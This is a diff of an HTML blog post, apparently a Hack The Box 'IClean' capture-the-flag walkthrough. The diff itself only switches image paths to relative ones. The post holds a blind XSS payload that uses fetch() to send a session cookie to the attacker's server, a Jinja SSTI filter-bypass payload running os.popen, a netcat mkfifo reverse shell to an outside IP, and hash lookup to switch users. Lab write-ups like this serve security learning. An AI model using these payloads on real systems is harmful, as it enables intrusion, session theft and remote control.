@@ -4,7 +4,7 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>HTB IClean Guide</title>
-  <link rel="stylesheet" href="/static/css/styles.css"/>
+  <link rel="stylesheet" href="static/css/styles.css"/>
 </head>
 <body>
   <div class="container">
@@ -14,7 +14,7 @@
         <span class="date">2024-05-10</span> —
         <span class="tags"><span class="tag">HTB</span><span class="tag">XSS</span><span class="tag">SSTI</span></span>
       </div>
-      <img class="post-banner" src="/static/images/htb_iclean_guide_banner.png" alt="Imagem do post"/>
+      <img class="post-banner" src="static/images/htb_iclean_guide_banner.png" alt="Imagem do post"/>
     </header>
     <article class="post-body">
       <p>Iclean is a Hack The Box machine that involves exploring a XSS and SSTI vulnerabilities on a flask application, once we get a shell on the machine we need to do a little lateral movement to change to another user account and then get to privilege escalation using qpdf with sudo.</p>
@@ -38,7 +38,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.51 seconds
 </code></pre>
 <h2>Initial analysis</h2>
 <p>As we saw with the Nmap scan, the machine is hosting a web server on port 80, so let's give it a look:
-<img alt="iclean_webserver.png" src="/static/images/htb_iclean_guide_1.png"/></p>
+<img alt="iclean_webserver.png" src="static/images/htb_iclean_guide_1.png"/></p>
 <h2>Web Directory Enumeration</h2>
 <p>One thing that we can do is enumerate some of the directories on the site while we work to find something useful, to do this I will try out <code>dirb</code>:</p>
 <pre><code>┌──(kali㉿atropos)-[~]
@@ -73,11 +73,11 @@ DOWNLOADED: 4612 - FOUND: 8
 </code></pre>
 <h2>Initial Analysis</h2>
 <p>Checking the pages we can find two interesting things, first the page <code>dashboard</code> redirect us automatically send us to the home page (as we can see on the HTTP 302 Code), that means we probably can access this page with some kind of right permissions like a cookie. The other page that looks promising is the <code>quote</code> page, there we can find an input field, we can try some things with that:
-<img alt="iclean_quote_page.png" src="/static/images/htb_iclean_guide_2.png"/>
+<img alt="iclean_quote_page.png" src="static/images/htb_iclean_guide_2.png"/>
 To better fuzz with that page we can intercept the requests with <code>BurpSuite</code>, that way we can also see the raw request. We can see on the request that we have 2 parameters where we can fuzz <code>email</code> and <code>service</code>:
-<img alt="Iclean_Burp1.png" src="/static/images/htb_iclean_guide_3.png"/>
+<img alt="Iclean_Burp1.png" src="static/images/htb_iclean_guide_3.png"/>
 We can try to catch some SQL Injection on those parameter but nothing seams to work. Another thing we can try is XSS. To try and see if we can use XSS let's forward that request and see the response on the browser:
-<img alt="Iclean_site2.png" src="/static/images/htb_iclean_guide_4.png"/>
+<img alt="Iclean_site2.png" src="static/images/htb_iclean_guide_4.png"/>
 We can see that the page doesn't have any kind of reflection for the service or email, so we will need to try some XSS that doesn't use reflection, that means that the standard <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> is not going to work. We can use a XSS payload like that: <code>&lt;img src=x onerror=fetch("http://IP:PORT/it-works");&gt;</code></p>
 <p>That XSS will try to insert an image that will certainly provoke an error, since we provided an invalid <code>src</code>, than we will use the <code>fetch</code> function from JavaScript to <code>fetch</code> a file from your web server, that way if that is executed we will see a request. Before we send this to <code>Burbsuite</code> we need to set up a web server, we can use python for that:</p>
 <pre><code>┌──(kali㉿atropos)-[~]
@@ -85,7 +85,7 @@ We can see that the page doesn't have any kind of reflection for the service or 
 Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
 </code></pre>
 <p>Now we can configure your Burp to send that payload, it is important that we URL encode all key characters, we can do that selecting the text that we want to encode, than click with right mouse button, <strong>Convert Selection(1)</strong> → <strong>URL(2)</strong> → <strong>URL-encode key characters(3)</strong>
-<img alt="Iclean_Burp2.png" src="/static/images/htb_iclean_guide_5.png"/>
+<img alt="Iclean_Burp2.png" src="static/images/htb_iclean_guide_5.png"/>
 Once we forward that request we can see the request on your python web server:</p>
 <pre><code>┌──(kali㉿atropos)-[~]
 └─$ python3 -m http.server 8081
@@ -102,9 +102,9 @@ Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
 10.10.11.12 - - [11/May/2024 09:41:48] "GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zj9XFw.y6U6qnQFuUOzPPAscFR7-Eyq2Tk HTTP/1.1" 404 -
 </code></pre>
 <p>Now we can add this cookie to our browser and try to access any page that we got an HTTP code 302( in this case <code>dashboard</code>), to add this cookie we can user a plugin to edit cookies, or we can add it manually on the browser:
-<img alt="Iclean_cookie_add.png" src="/static/images/htb_iclean_guide_6.png"/>
+<img alt="Iclean_cookie_add.png" src="static/images/htb_iclean_guide_6.png"/>
 To add a cookie manually we can navigate to the storage tab on the debug panel, go to the cookies section and add a new one clicking on the plus sign(1), than add the cookie name(2), in this case is <code>session</code>, than the cookie value(3), in this case is <code>eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zj9XFw.y6U6qnQFuUOzPPAscFR7-Eyq2Tk</code>, and set the path(4) to the root <code>/</code>. That way, we can try to access the page dashboard and see if there is any difference.
-<img alt="Iclean_dashboard.png" src="/static/images/htb_iclean_guide_7.png"/></p>
+<img alt="Iclean_dashboard.png" src="static/images/htb_iclean_guide_7.png"/></p>
 <h2>Getting a shell</h2>
 <p>Accessing the dashboard page now we are not redirected to the home page, now we can see the actual dashboard, here we can see 4 different options to further fuzz. But before we continue, there is an important aspect of this application, with the last request we did with Burpsuite, we can see on the header of the HTTP response a <code>Server</code> information:</p>
 <pre><code>HTTP/1.1 200 OK
@@ -120,18 +120,18 @@ Content-Length: 5048
 <p>WSGI is the Web Server Gateway Interface. It is a specification that describes how a web server communicates with web applications, and how web applications can be chained together to process one request.
 https://wsgi.readthedocs.io/en/latest/what.html</p>
 </blockquote>
-<p><img alt="Iclean_generate_invoice.png" src="/static/images/htb_iclean_guide_8.png"/>
+<p><img alt="Iclean_generate_invoice.png" src="static/images/htb_iclean_guide_8.png"/>
 Once we click on Generate, we can see an invoice id was generated, I tried to fuzz with the inputs on that page but without any kind of interesting result. So let's try to use the invoice id to access other functionalities.
-<img alt="Pasted image 20240511131521.png" src="/static/images/htb_iclean_guide_9.png"/>
+<img alt="Pasted image 20240511131521.png" src="static/images/htb_iclean_guide_9.png"/>
 Now let's move forward with that to the page Generate QR, there we need to input our invoice id, then a QR code link will be generated, then we need to add this QR code link on the input down below. Once we click on submit a new page will open with information about the invoice:
-<img alt="Iclean_qrcode.png" src="/static/images/htb_iclean_guide_10.png"/>
+<img alt="Iclean_qrcode.png" src="static/images/htb_iclean_guide_10.png"/>
 Capturing the request with <code>Burpsuite</code> again we can see that the <code>qr_link</code> POST parameter is vulnerable to <strong>SSTI</strong> (Server Side Template Injection):
-<img alt="Iclean_SSTI_1.png" src="/static/images/htb_iclean_guide_11.png"/>
+<img alt="Iclean_SSTI_1.png" src="static/images/htb_iclean_guide_11.png"/>
 On (1) we inserted some python code on a template formatting for Jinja, using the <code>{{ *code here* }}</code>, on (2) we can see that the python executed our command, creating a string with 5 consecutive <code>'test'</code>. Now we could just use a python reverse shell to gain access to the machine. But, the application looks like it has some kind of filters, any simple reverse shell is not going to work, we can use some of the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md?source=post_page-----171621c377e7--------------------------------#jinja2---basic-injection">filter bypassing</a> for Jinja.</p>
 <p>One that looks like it works is:</p>
 <pre><code class="language-python">{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 </code></pre>
-<p><img alt="Iclean_SSTI_2.png" src="/static/images/htb_iclean_guide_12.png"/>
+<p><img alt="Iclean_SSTI_2.png" src="static/images/htb_iclean_guide_12.png"/>
 Here we can see that the filter bypass(1) worked as intended, outputting the <code>id</code> command. So we can modify that filter bypass to create a reverse shell. So I tried a bunch of reverse shells and the one I got a shell back was this one:</p>
 <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.183 8002 &gt;/tmp/f
 </code></pre>
@@ -250,7 +250,7 @@ mysql&gt; select * from users;
 2 rows in set (0.00 sec)
 </code></pre>
 <p>Now we can start cracking those hashes and see if we can use this on the users on the machine. To do this I will first just simply do a search on those hashes, this is a faster approach than just plug those in to hashcat, luckily we will find a match:
-<img alt="Iclean_hash_search.png" src="/static/images/htb_iclean_guide_13.png"/>
+<img alt="Iclean_hash_search.png" src="static/images/htb_iclean_guide_13.png"/>
 Here I just used a <a href="https://hashes.com/en/decrypt/hash">site</a> to make a search on those hashes, luckily we found the password for the user consuela. Let's try to change the user on the machine using that password:</p>
 <pre><code>www-data@iclean:/opt/app$ su consuela
 Password: 
